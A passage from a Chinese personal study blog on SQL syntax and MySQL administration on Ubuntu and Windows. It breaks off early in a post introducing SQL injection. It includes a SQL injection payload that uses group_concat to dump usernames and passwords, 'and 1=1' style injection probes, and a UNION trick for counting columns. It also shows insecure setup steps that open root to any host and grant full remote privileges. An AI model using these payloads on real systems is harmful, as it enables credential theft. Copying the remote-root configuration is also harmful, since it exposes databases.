class="keyword">WHERE</span> name <span class="keyword">BETWEEN</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;H&#x27;</span>; </span><br><span class="line">选取 name 以介于 <span class="string">&#x27;A&#x27;</span> 和 <span class="string">&#x27;H&#x27;</span> 之间字母开始的所有网站</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> name <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;A&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;H&#x27;</span>; </span><br></pre></td></tr></table></figure><ul><li>带有日期的between</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> access_log <span class="keyword">WHERE</span> <span class="type">date</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;2016-05-10&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2016-05-14&#x27;</span>; </span><br><span class="line">选取 <span class="type">date</span> 介于 <span class="string">&#x27;2016-05-10&#x27;</span> 和 <span class="string">&#x27;2016-05-14&#x27;</span> 之间的所有访问记录：</span><br></pre></td></tr></table></figure><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><ul><li>合并两个或多个 SELECT 语句的结果</li><li>UNION 内部的每个 SELECT 语句必须拥有相同数量的列。</li><li>列也必须拥有相似的数据类型。</li><li>每个 SELECT 语句中的列的顺序必须相同</li><li>UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure><ul><li>默认地，UNION 操作符只会选取不同的值。如果允许重复的值，使用 UNION ALL。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country; </span><br></pre></td></tr></table></figure><ul><li>带有where的union语句</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> country, name <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> country<span class="operator">=</span><span class="string">&#x27;CN&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> country, app_name <span class="keyword">FROM</span> apps</span><br><span class="line"><span class="keyword">WHERE</span> country<span class="operator">=</span><span class="string">&#x27;CN&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> country; </span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.runoob.com/sql/sql-union.html">https://www.runoob.com/sql/sql-union.html</a></p></blockquote><h2 id="SQL函数"><a href="#SQL函数" class="headerlink" title="SQL函数"></a>SQL函数</h2><h3 id="count-函数"><a href="#count-函数" class="headerlink" title="count()函数"></a>count()函数</h3><ul><li><p>返回匹配指定条件的行数</p></li><li><p>COUNT(column_name) 函数返回指定列的值的数目（NULL 不计入）</p></li><li><p>COUNT(*) 函数返回表中的记录数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure></li><li><p>COUNT(DISTINCT column_name) 函数返回指定列的不同值数目COUNT(DISTINCT) 适用于 ORACLE 和 Microsoft SQL Server，但是无法用于 Microsoft Access。</p></li></ul><blockquote><p><a href="https://www.runoob.com/sql/sql-func-count.html">https://www.runoob.com/sql/sql-func-count.html</a></p></blockquote><h3 id="len-函数"><a href="#len-函数" class="headerlink" title="len()函数"></a>len()函数</h3><ul><li>返回文本字段中值的长度。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SQL</span>中len语法</span><br><span class="line"><span class="keyword">SELECT</span> LEN(column_name) <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line">mysql中函数为length()</span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(column_name) <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> name, LENGTH(url) <span class="keyword">as</span> LengthOfURL <span class="keyword">FROM</span> Websites; </span><br><span class="line">从websites表中用length函数得到url列各个值的长度，结果作为一个叫lengthofurl的新列，返回name和length(url)结果;</span><br></pre></td></tr></table></figure><h3 id="group-concat-函数"><a href="#group-concat-函数" class="headerlink" title="group_concat() 函数"></a>group_concat() 函数</h3><ul><li>用来一次性全部得到所有username和password的结果，省去limit一个个看</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>, group_concat(username),group_concat(password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><blockquote><p>从曾老师处学的</p></blockquote><h3 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h3><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><h2 id="铺垫"><a href="#铺垫" class="headerlink" title="铺垫"></a>铺垫</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul><li>每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</li><li>我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。</li><li>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</li><li>RDBMS 即关系数据库管理系统(Relational Database Management System)的特点：列——表——库<ul><li>1.数据以表格的形式出现</li><li>2.每行为各种记录名称</li><li>3.每列为记录名称所对应的数据域</li><li>4.许多的行和列组成一张表单</li><li>5.若干的表单组成database</li></ul></li></ul><h3 id="RDBMS术语"><a href="#RDBMS术语" class="headerlink" title="RDBMS术语"></a>RDBMS术语</h3><ul><li><strong>数据库:</strong> 数据库是一些关联表的集合。</li><li><strong>数据表:</strong> 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。</li><li><strong>列:</strong> 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。</li><li><strong>行：</strong>一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。</li><li><strong>冗余</strong>：存储两倍数据，冗余降低了性能，但提高了数据的安全性。</li><li><strong>主键</strong>：主键是唯一的。一个数据表中只能包含一个主键。你可以使用主键来查询数据。</li><li><strong>外键：</strong>外键用于关联两个表。</li><li><strong>复合键</strong>：复合键（组合键）将多个列作为一个索引键，一般用于复合索引。</li><li><strong>索引：</strong>使用索引可快速访问数据库表中的特定信息。索引是对数据库表中一列或多列的值进行排序的一种结构。类似于书籍的目录。</li><li><strong>参照完整性:</strong> 参照的完整性要求关系中不允许引用不存在的实体。与实体完整性是关系模型必须满足的完整性约束条件，目的是保证数据的一致性。</li></ul><hr><p>所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或数个表格组成,如图所示的一个表格:</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210717114239383.png" alt="image-20210717114239383"></p><ul><li>表头(header): 每一列的名称;</li><li>列(col): 具有相同数据类型的数据的集合;</li><li>行(row): 每一行用来描述某条记录的具体信息;</li><li>值(value): 行的具体信息, 每个值必须与该列的数据类型相同;</li><li>键(key): 键的值在当前列中具有唯一性。</li></ul><h3 id="基于C-S架构的DBMS"><a href="#基于C-S架构的DBMS" class="headerlink" title="基于C/S架构的DBMS"></a>基于C/S架构的DBMS</h3><p>DBMS有两类</p><ul><li>基于共享文件系统的 DBMS（ Microsoft Access、FileMaker）</li><li>基于客户端—服务器的 DBMS（ MySQL、Oracle 、Microsoft SQL Server）。</li></ul><p>C/S架构分为客户端和服务端两个部分</p><h3 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h3><ul><li>MySQL 是开源的，目前隶属于 Oracle 旗下产品。</li><li>MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。</li><li>MySQL 使用标准的 SQL 数据语言形式。</li><li>MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li><li>MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。</li><li>MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li><li>MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。（阿里的就是魔改版本）</li></ul><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><ul><li>服务器部分是负责所有数据访问和处理的一个软件，即DBMS，安装 MySQL  组件时，MySQL server就是 MySQL组件中服务器部分的软件。该软件运行在称为数据库服务器的计算机上。</li><li>客户端和服务器软件可以安装在两台计算机或一台计算机上。</li><li>与数据文件打交道的只有服务器软件。关于数据查找、数据添加、删除和数据更新的所有请求都由服务器软件完成。这些请求或更改来自运行客户端软件的计算机。客户端是与用户打交道的软件。例如，如果你请求一个按字母顺序列出的产品表，则客户端软件通过网络提交该请求给服务器软件。服务器软件处理这个请求，根据需要过滤、丢弃和排序数据；然后把结果送回到你的客户端软件。</li></ul><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><ul><li>为了使用 MySQL，你需要运行 MySQL 服务器软件和用于发送命令到 MySQL 服务器软件的客户端软件</li><li>客户端可以是：<ul><li>MySQL 提供的工具（如安装 MySQL 后有一个 MySQL Command Line Client）</li><li>MySQL 命令行管理工具（如 mycli）</li><li>MySQL 图形化管理工具（如 Navicat）</li><li>各种支持 MySQL 的编程语言（如 Java，app中使用到的SQL语句）</li></ul></li></ul><h3 id="mysqld-cnf配置文件"><a href="#mysqld-cnf配置文件" class="headerlink" title="mysqld.cnf配置文件"></a>mysqld.cnf配置文件</h3><ul><li><p>skip_networking 该变量控制是否关闭TCP/IP连接，默认允许，如果启用，则只能本地socker连接。如果只是本地客户端连接，强烈建议开启。</p></li><li><p>bind-address ,<strong>Instead of skip-networking</strong> the default is now to listen only on localhost which is more compatible and is not less secure.<img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125110923176.png" alt="image-20221125110923176"></p></li><li><p>官方文档<a href="https://dev.mysql.com/doc">https://dev.mysql.com/doc</a></p></li></ul><h2 id="实操——Linux"><a href="#实操——Linux" class="headerlink" title="实操——Linux"></a>实操——Linux</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>ubuntu 18安装mysql</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep mysql #查看是否已经安装</span><br><span class="line">apt-get install mysql-server</span><br><span class="line"><span class="meta">#</span><span class="bash">sudo apt-get install mysql-server mysql-client</span></span><br><span class="line">systemctl status mysql</span><br><span class="line">netstat -anp | grep 3306</span><br><span class="line">mysqladmin version</span><br><span class="line">mysqladmin  Ver 8.42 Distrib 5.7.40, for Linux on x86_64</span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221115173706883.png" alt="image-20221115173706883"></p><p>/etc/mysql/debian.cnf</p><p>里面有一个debian-sys-maint用户，这个用户只有Debian或Ubuntu服务器才有，debian-sys-maint是个Mysql安装之后自带的用户，作用是重启及运行mysql服务。所以如果忘了root密码，可以通过这个用户来重设密码。<br><a href="https://blog.csdn.net/lym152898/article/details/53897260">https://blog.csdn.net/lym152898/article/details/53897260</a></p><h3 id="三种启动方式"><a href="#三种启动方式" class="headerlink" title="三种启动方式"></a>三种启动方式</h3><p>同一台ubuntu上同时运行两个mysql服务，服务器重启之后产生冲突问题。</p><p>有可能是因为您的服务器重启后，mysql 的启动顺序或者启动方式发生了变化，导致了配置文件的冲突或者端口的占用，检查一下您的服务器是如何启动 mysql 服务的，是使用 service 命令，还是使用 mysqld 脚本，还是使用 safe_mysqld 命令<br>不同的启动方式可能会调用不同的配置文件或者参数，需要确保它们之间没有冲突或者错误。也可以检查一下您的 mysql 服务是否监听了正确的端口，是否有其他进程或者防火墙阻止了端口的访问</p><ul><li><a href="https://www.cnblogs.com/benwu/articles/9061345.html">mysqld：直接运行mysql的核心程序，只有一个进程，没有守护进程，如果mysql服务挂了，没有检查重启的机制，生产环境不推荐使用</a><a href="https://www.cnblogs.com/benwu/articles/9061345.html">1</a>。</li><li><a href="https://blog.csdn.net/JustinQin/article/details/120114603">mysqld_safe：运行一个Shell脚本，会启动两个进程，一个是mysqld，一个是监控进程，如果mysql服务挂了，会自动重启，生产环境推荐使用</a><a href="https://blog.csdn.net/JustinQin/article/details/120114603">2</a>。</li><li><a href="https://www.cnblogs.com/benwu/articles/9061345.html">mysql.server：运行一个Shell脚本，会调用mysqld_safe脚本，可以通过service命令方便地启动和停止mysql服务，适合开发环境使用</a><a href="https://bing.com/search?q=service+mysqld+mysqld_safe+%E5%8C%BA%E5%88%AB">3</a>。</li></ul><p>启动方法</p><ul><li><a href="https://www.runoob.com/mysql/mysql-administration.html">mysqld：在命令行中输入 <code>mysqld</code> 命令，或者在mysql的安装目录下的bin目录中运行 <code>mysqld</code> 程序</a><a href="https://www.runoob.com/mysql/mysql-administration.html">1</a>。</li><li><a href="https://www.runoob.com/mysql/mysql-tutorial.html">mysqld_safe：在命令行中输入 <code>mysqld_safe</code> 命令，或者在mysql的安装目录下的bin目录中运行 <code>mysqld_safe</code> 脚本</a><a href="https://www.runoob.com/mysql/mysql-tutorial.html">2</a>。</li><li><a href="https://www.mysql.com/it/">mysql.server：在命令行中输入 <code>service mysql start</code> 命令，或者在mysql的安装目录下的support-files目录中运行 <code>mysql.server</code> 脚本</a><a href="https://www.mysql.com/it/">3</a>。</li></ul><p>不同的启动方式分别会调用不同的配置文件或者参数，具体如下：</p><ul><li><a href="https://www.mysql.com/cn/">mysqld：会读取 <code>/etc/my.cnf</code> 和 <code>/etc/mysql/my.cnf</code> 中的全局配置，以及 <code>~/.my.cnf</code> 中的用户配置，也可以在命令行中指定其他的配置文件或者参数</a><a href="https://www.mysql.com/cn/">4</a>。</li><li><a href="https://www.cnblogs.com/winton-nfs/p/11524007.html">mysqld_safe：会读取 <code>/etc/my.cnf</code> 和 <code>/etc/mysql/my.cnf</code> 中的全局配置，以及 <code>~/.my.cnf</code> 中的用户配置，也可以在命令行中指定其他的配置文件或者参数，还会读取 <code>/usr/share/mysql/mysql-systemd-start</code> 中的配置，用于设置环境变量和路径</a><a href="https://www.cnblogs.com/winton-nfs/p/11524007.html">5</a>。</li><li>mysql.server：会读取 <code>/etc/my.cnf</code> 和 <code>/etc/mysql/my.cnf</code> 中的全局配置，以及 <code>~/.my.cnf</code> 中的用户配置，也可以在命令行中指定其他的配置文件或者参数，还会读取 <code>/etc/init.d/mysql</code> 中的配置，用于设置服务的名称和用户。</li></ul><h3 id="修改空密码"><a href="#修改空密码" class="headerlink" title="修改空密码"></a>修改空密码</h3><p>默认mysql装好是无密码的</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221116162303200.png" alt="image-20221116162303200"></p><p>用debian-sys-maint用户登进去之后修改mysql的root密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1)、use mysql;                   #连接到mysql数据库</span><br><span class="line">2)、update mysql.user set authentication_string&#x3D;password(&#39;123456&#39;) where user&#x3D;&#39;root&#39; and Host &#x3D;&#39;localhost&#39;;    #修改密码123456是密码</span><br><span class="line">3)、update user set  plugin&#x3D;&quot;mysql_native_password&quot;;     </span><br><span class="line">4)、flush privileges;</span><br><span class="line">5)、quit; </span><br><span class="line">6)、service mysql restart &#x2F;systemctl restart mysql也可以不重启</span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221116162649681.png" alt="image-20221116162649681"></p><h3 id="mysqladmin命令行管理"><a href="#mysqladmin命令行管理" class="headerlink" title="mysqladmin命令行管理"></a>mysqladmin命令行管理</h3><p>修改root密码，刚安装好的mysql无密码状态不适用下列命令</p><p>mysqladmin -uroot -ppassword password ‘xiaoyao@123’ </p><p>参考<a href="https://www.cnblogs.com/weiweirui/p/16608062.html">https://www.cnblogs.com/weiweirui/p/16608062.html</a></p><h3 id="本地连接"><a href="#本地连接" class="headerlink" title="本地连接"></a>本地连接</h3><p>mysql -u -root -p 回车输入密码</p><p>ubuntu系统也可以用debian.cnf里面的账户密码登录，这是mysql给ubuntu和debian系统自动创建的用户</p><h3 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h3><h4 id="防火墙与mysql管理软件"><a href="#防火墙与mysql管理软件" class="headerlink" title="防火墙与mysql管理软件"></a>防火墙与mysql管理软件</h4><p>主机防火墙，云服务提供商防火墙，自己这边用的phpstudy的phpmyadmin4.8.5，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql</span><br><span class="line">mysql&gt; update user <span class="built_in">set</span> host = <span class="string">&#x27;%&#x27;</span>  where user =<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">mysql&gt; select <span class="string">&#x27;host&#x27;</span>,<span class="string">&#x27;user&#x27;</span> <span class="keyword">from</span> user where user=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">mysql&gt; quit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ufw status</span><br><span class="line">ufw allow <span class="number">3306</span></span><br><span class="line">ufw allow/deny <span class="number">3306</span></span><br></pre></td></tr></table></figure><h4 id="创建远程访问用户"><a href="#创建远程访问用户" class="headerlink" title="创建远程访问用户"></a>创建远程访问用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create user xiaoyao; </span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO xiaoyao@&quot;%&quot; IDENTIFIED BY &#39;xiaoyao@123&#39; WITH GRANT OPTION;</span><br><span class="line">flush privileges; </span><br></pre></td></tr></table></figure><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221116163345568.png" alt="image-20221116163345568"></p><h5 id="phpmyadmin连接"><a href="#phpmyadmin连接" class="headerlink" title="phpmyadmin连接"></a>phpmyadmin连接</h5><ul><li><p>phpstudy自带的phpmyadmin4.8.5死活连不上去，</p></li><li><p>先打开phpstudy本地的apache和mysql，重启phpmyadmin，看到localhost之后再操作</p></li><li><p>一次只能连一个，没法设置要连接的ip，修改phpmyadmin目录中libraries文件夹下的config.default.php文件<code>$cfg[&#39;AllowArbitraryServer&#39;] = true;</code>本质上是让<code>$cfg[&#39;Servers&#39;][$i][&#39;user&#39;]</code>这些变得可修改</p></li><li><p>报错设置cookie失败，改用火狐浏览器解决</p></li><li><p>报错mysqli_real_connect(): (HY000/2002): +乱码，把mysql服务器mysql.conf.d里的bind-address给注释掉就能连上了</p><ul><li>bind-address一改就systemctl restart mysql失败，查看mysql日志</li><li>systemctl restart mysql  更改mysqld.cnf之后<img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125141234787.png" alt="image-20221125141234787"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125141357335.png" alt="image-20221125141357335"><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125141652898.png" alt="image-20221125141652898"></li><li>翻var/log/mysql/error.log<img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125142311682.png" alt="image-20221125142311682"></li><li>查bind-address这个配置<a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_bind_address![image-20221125154514076](https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125154514076.png)">https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_bind_address![image-20221125154514076](https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125154514076.png)</a></li><li>破案了，真的和下面这个<a href="https://www.cnblogs.com/valley-yyds/p/15625091.html">博客</a>说的一样，专门查了官方文档，人家最后也是用”root“@“::1”举例，其中bind-address=::1,所以用户名@主机地址  表示root用户可以访问或将要访问的主机地址，那这个地址就是bind-address所绑定的mysql服务器上的::1的这个与网卡绑定的ip地址，bind-address用于单服务器多网卡多IP的场景<img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125155035929.png" alt="image-20221125155035929"></li><li>所以把mysqld.cnf中的bind-address注释掉就可以systemctl restart mysql了</li></ul></li></ul><h5 id="navicat-连接"><a href="#navicat-连接" class="headerlink" title="navicat 连接"></a>navicat 连接</h5><p>（以为phpstudy自带的phpmyadmin不好用，专门去找了个navicat，一款可以连接多种数据库的数据库管理软件，特喵的刚下好navicat问题解决了）</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125155741912.png" alt="image-20221125155741912"></p><ul><li><p>有一说一，navicat真香，有手就行，很好用（咳咳！navicat该打广告费了）<img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20221125160015303.png" alt="image-20221125160015303"></p></li><li><p>附一个navicat使用跳板机连接mysql的例子<a href="https://www.cnblogs.com/ExMan/p/16285249.html">https://www.cnblogs.com/ExMan/p/16285249.html</a> 本质上就是navicat用ssh隧道转发流量包</p></li></ul><h3 id="白名单管理"><a href="#白名单管理" class="headerlink" title="白名单管理"></a>白名单管理</h3><p>mysql-user表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql -h host -u username -p password</span><br><span class="line">use mysql;</span><br><span class="line">select Host,User from user;</span><br><span class="line">DELETE FROM user WHERE User&#x3D;&#39;username&#39; and Host&#x3D;&#39;host&#39;;删除不需要的</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39; WITH GRANT OPTION; 增加需要的</span><br><span class="line">FLUSH PRIVILEGES; 刷新</span><br></pre></td></tr></table></figure><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>dpkg -l | grep mysql 卸载干净了</p><h2 id="实操——Windows"><a href="#实操——Windows" class="headerlink" title="实操——Windows"></a>实操——Windows</h2><h3 id="命令行控制数据库"><a href="#命令行控制数据库" class="headerlink" title="命令行控制数据库"></a>命令行控制数据库</h3><p>phpstudy中进入extension/mysql/bin  在此打开cmd，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql.exe <span class="literal">-uroot</span> <span class="literal">-proot</span> <span class="comment">#输入用户名和密码</span></span><br><span class="line"><span class="comment">#进入mysql之后要用分号结尾</span></span><br><span class="line">show databases;  <span class="comment">#查看数据库所有的库名</span></span><br><span class="line">use [库名]; <span class="comment">#进入某个数据库</span></span><br><span class="line">show tables; <span class="comment">#查看数据库有多少张表</span></span><br><span class="line"><span class="built_in">select</span> * from [表名]; <span class="comment">#查看表中所有内容</span></span><br><span class="line"><span class="built_in">select</span> * from table1 <span class="built_in">where</span> id &lt; <span class="number">13</span> limit <span class="number">1</span>,<span class="number">2</span>; <span class="comment">#限制只显示id为1和2的数据，下标从0开始；limit 0,3;表示从第0条开始取3个</span></span><br><span class="line"><span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>;  <span class="comment">#自动创建表，当后面跟数字或引号字符串时，不查询数据表，返回自己构造的数据。详细用法select参考https://blog.csdn.net/weixin_44840696/article/details/89166154</span></span><br><span class="line"><span class="built_in">select</span> <span class="string">&#x27;haha&#x27;</span>,<span class="string">&#x27;nihaoya&#x27;</span>,<span class="string">&#x27;hi&#x27;</span>;<span class="comment">#字符串要用引号引起来，</span></span><br><span class="line"></span><br><span class="line">union 联合查询（limit会坏好事）</span><br><span class="line"><span class="built_in">select</span> * from table1 <span class="built_in">where</span> id &lt; <span class="number">13</span> union <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>; <span class="comment">#查完前面之后再union联合查询1,2,3，效果就是在数据库表下面新添数据，select添加的数字个数与表的字段个数一致时才成功，这个性质可以用来嗅探数据表中有多少个项（前提是select*），select后添加的数字不能真的被当做表项的值，比如这里id=2就调不出来对应项数据</span></span><br><span class="line"></span><br><span class="line">limit i,n，<span class="comment">#i为查询结果的索引值（默认从0开始）；n为查询结果返回的数量，从i开始向后数</span></span><br></pre></td></tr></table></figure><p>这里的table1理论上应该用反引号包起来，table，from是数据库中的敏感词，用作库名或表名是需要用反引号表示为字符，如果不是敏感词可以不用加反引号。（ctf中可能会遇到）</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/sqli/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/sqli/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="数据库攻击"><a href="#数据库攻击" class="headerlink" title="数据库攻击"></a>数据库攻击</h3><p>SQL注入bai是一种非常常见的数据库攻击手段，SQL注入漏洞也是网络世界中最普遍的漏洞之一。攻击学校数据库修改自己成绩的事情，这些学长们一般用的就是SQL注入方法。</p><p>SQL注入其实就是恶意用户通过在表单中填写包含SQL关键字的数据来使数据库执行非常规代码的过程。简单来说，就是数据「越俎代庖」做了代码才能干的事情。</p><p>这个问题的来源是，SQL数据库的操作是通过SQL语句来执行的，而无论是执行代码还是数据项都必须写在SQL语句之中，这就导致如果我们在数据项中加入了某些SQL语句关键字（比如说SELECT、DROP等等），这些关键字就很可能在数据库写入或读取数据时得到执行。</p><p><strong>SQL注入的产生需要满足以下两个条件</strong></p><p>1、参数用户可控：前端传给后端的参数用户可控。</p><p>2、参数带入数据库查询：传入的参数拼接到SQL语句中，且带入数据库中查询。</p><p><strong>按照注入点分类：</strong></p><p>（1）数字型注入：许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，注入点id为数字，一般被叫做数字型注入点，通过这种形式查询出后台数据库信息返回前台展示，可以构造类似以下的SQL语句进行爆破：select *** from 表名 where id=1 and 1=1。<br>（2）字符型注入：网页链接有类似的结构</p><p><a href="http://xxx.com/users.php?name=admin">http://xxx.com/users.php?name=admin</a> 这种形式，注入点name为字符串，被称为字符型注入，可以用：select *** from 表名 where name=’admin’ and 1=1。</p><p>（3）搜索型注入：主要是指在数据搜索时没有过滤搜索参数，一般在链接地址中有 “keyword=“关键字””，注入点提交的是SQL语句，select * from 表名 where 字段 like ‘%关键字%’ and ‘%1%’=’%1%’。 </p><h3 id="注入点"><a href="#注入点" class="headerlink" 